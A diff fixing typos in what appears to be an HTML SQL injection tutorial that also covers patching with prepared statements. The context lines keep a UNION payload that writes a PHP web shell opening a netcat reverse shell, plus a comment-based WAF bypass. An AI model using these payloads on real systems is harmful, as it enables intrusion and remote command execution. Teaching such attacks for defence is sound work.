@@ -256,7 +256,7 @@
     <p><code
         class="bg-dark text-white p-1">' union select "&lt;?php passthru('nc -e /bin/bash 127.0.0.1 8888'); ?>",null,null,null,null,null,null into outfile '/tmp/shell.php' #</code>
     </p>
-    <p>Here are are using the passthru() php function for executing a system command. In this case, I am listening for
+    <p>Here we are using the passthru() php function for executing a system command. In this case, I am listening for
       my own connection on port 8888 using netcat. An attacker will write his ip address.</p>
     <img class="center image" src="images/listening.png" />
     <p>And now we just need to get that file to execute. I will explain this in the Local File Inclusion section.</p>
@@ -379,7 +379,7 @@
       is the default hashing algorithm to use in PHP.</p>
     <hr />
     <h3 class="title-padding" id="important">Important</h3>
-    <p><strong><u>WAF (Web Application Firewall) will not protect your website against sql injection, xss or other type of vulnerability. Someone can use a syntax like this: <code class="bg-dark text-white p-1">/*!50000UNION*/ /*!50000SELECT*/</code> and bypass the waf protection for a successfull sqli attack.</u></strong></p>
+    <p><strong><u>WAF (Web Application Firewall) will not protect your website against sql injection, xss or other type of vulnerability. Someone can use a syntax like this: <code class="bg-dark text-white p-1">/*!50000UNION*/ /*!50000SELECT*/</code> and bypass the waf protection for a successful sqli attack.</u></strong></p>
     <h3 class="title-padding" id="patch-sqli">Patching SQL Injection</h3>
     <p>In order for us to patch SQL Injections, we must use prepared statements. <u>Using prepared statements is the
         only proper way to do a sql statement.</u> I will show you how to use PDO (PHP Data Objects) with prepared
